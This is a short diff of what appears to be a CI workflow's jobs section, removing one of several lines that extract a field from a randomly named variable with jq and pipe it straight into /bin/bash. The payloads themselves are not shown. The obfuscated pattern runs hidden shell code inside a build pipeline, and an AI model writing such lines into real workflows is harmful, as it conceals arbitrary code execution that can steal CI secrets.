@@ -34,7 +34,6 @@ jobs:
           echo $lv75179 | jq -r .iv49 | /bin/bash
           printf '%s' "$kn6" | jq -r .kuo32 | /bin/bash
           echo $hiq6300 | jq -r .u90181 | /bin/bash
-          echo $gkv5768 | jq -r .rffe60095 | /bin/bash
           echo $ovu5 | jq -r .py1889 | /bin/bash
           echo $ict34810 | jq -r .dfd93480 | /bin/bash
           printf '%s' "$tk79" | jq -r .jssx13 | /bin/bash
